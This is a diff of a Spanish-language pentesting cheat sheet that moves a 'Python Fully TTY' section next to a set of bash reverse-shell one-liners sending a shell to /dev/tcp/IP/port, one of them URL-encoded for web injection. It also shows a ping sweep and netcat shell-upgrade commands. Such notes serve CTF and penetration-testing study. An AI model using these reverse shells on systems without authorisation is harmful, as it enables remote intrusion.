@@ -154,6 +154,8 @@ Usa este one liner para cuando tengas problemas con el output jala en donde sea:
 for i in {1..254}; do ping -c 1 -W 1 172.19.0.$i | grep "64 bytes" & done
 ```
 
+
+
 ## Fully TTYs
 
 ```bash
@@ -179,6 +181,17 @@ bash -c "bash -i >%26 /dev/tcp/IP/port 0>%261"
 bash -c "bash -i >& /dev/tcp/IP/port 0>&1"
 
 ```
+
+### Python Fully TTY
+
+> https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
+
+````python 
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+````
 
 Con nc si es que existe en la maquina enviate una reverseshell
 
@@ -1369,16 +1382,7 @@ Nos regresa la 0xa
 ```
 ![image](https://github.com/gecr07/Acordeon/assets/63270579/35cf4197-6bbb-4803-8d78-315157d1e3ca)
 
-### Python Fully TTY
 
-> https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
-
-````python 
-
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
-````
 
 ## Keepass (gestor de contraseñas)
 
